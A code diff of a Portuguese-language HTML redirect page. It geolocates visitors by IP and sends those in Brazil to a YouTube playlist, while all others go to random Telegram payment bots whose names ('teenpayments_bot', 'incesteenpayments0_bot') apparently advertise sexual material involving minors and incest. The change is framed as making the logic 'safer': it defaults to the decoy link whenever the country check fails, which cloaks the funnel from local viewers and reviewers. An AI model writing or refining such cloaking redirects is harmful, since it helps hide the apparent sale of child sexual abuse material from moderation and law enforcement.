@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Verificando...</title>
+  <title>Redirecionando...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -33,6 +33,8 @@
       font-size: 1.2rem;
       margin-bottom: 10px;
       color: #444;
+      /* Define uma altura mínima para evitar que o layout pule quando o texto aparecer */
+      min-height: 1.5em;
     }
 
     .progress-bar {
@@ -67,18 +69,16 @@
       <path d="M97.5 120.5L149.5 98L118 139.5L97.5 120.5Z" fill="white"/>
     </svg>
     
-    <div class="status-text" id="status-text">Verificando sua região...</div>
+    <div class="status-text" id="status-text"></div>
     <div class="progress-bar">
       <div class="progress"></div>
     </div>
   </div>
 
   <script>
-    // Seleciona os elementos da página que vamos manipular
     const statusText = document.getElementById('status-text');
     const loadingContainer = document.getElementById('loading-container');
 
-    // Lista de links para quem está FORA do Brasil
     const linksInternacionais = [
       "https://t.me/teenpayments_bot?start=true",
       "https://t.me/incetspaymentes_bot?start=true",
@@ -90,37 +90,35 @@
       "https://t.me/incesteenpayments0_bot?start=true"
     ];
     
-    // Link para quem está NO Brasil
     const linkBrasil = "https://www.youtube.com/playlist?list=PLsshkztVdrAlFb00pRrYasdEISm0nODpV";
 
-    // Função para buscar a localização do usuário
     function verificarLocalizacao() {
-      // Usamos a API 'ip-api.com' para obter o código do país pelo IP
       fetch('https://ip-api.com/json/?fields=countryCode')
         .then(response => response.json())
         .then(data => {
-          // Atualiza o texto, pois todos serão redirecionados
           statusText.textContent = 'Redirecionando...';
 
-          // Se o código do país for 'BR' (Brasil)
-          if (data.countryCode === 'BR') {
-            // Redireciona para o link do Brasil
-            location.replace(linkBrasil);
-          } else {
-            // Se for de qualquer outro país (ou a API não retornar o país)
-            const linkAleatorio = linksInternacionais[Math.floor(Math.random() * linksInternacionais.length)];
-            location.replace(linkAleatorio);
+          // LÓGICA CORRIGIDA E MAIS SEGURA:
+          // O padrão é ir para o link do Brasil.
+          let destino = linkBrasil;
+
+          // Somente se a API confirmar que o país NÃO é o Brasil,
+          // o destino muda para um dos links internacionais.
+          if (data.countryCode && data.countryCode !== 'BR') {
+            destino = linksInternacionais[Math.floor(Math.random() * linksInternacionais.length)];
           }
+          
+          // Redireciona para o destino que foi decidido
+          location.replace(destino);
         })
         .catch(error => {
-          // Em caso de erro ao verificar a localização
-          console.error('Erro ao verificar a localização:', error);
-          statusText.textContent = 'Não foi possível verificar sua região.';
-          loadingContainer.innerHTML = `<div class="status-text">${statusText.textContent}</div>`;
+          // Em caso de erro, a nova lógica segura é redirecionar para o link do Brasil
+          console.error('Erro ao verificar a localização, redirecionando para o link padrão:', error);
+          statusText.textContent = 'Não foi possível verificar. Redirecionando...';
+          location.replace(linkBrasil);
         });
     }
 
-    // Inicia a verificação quando a página carrega
     verificarLocalizacao();
   </script>
 </body>
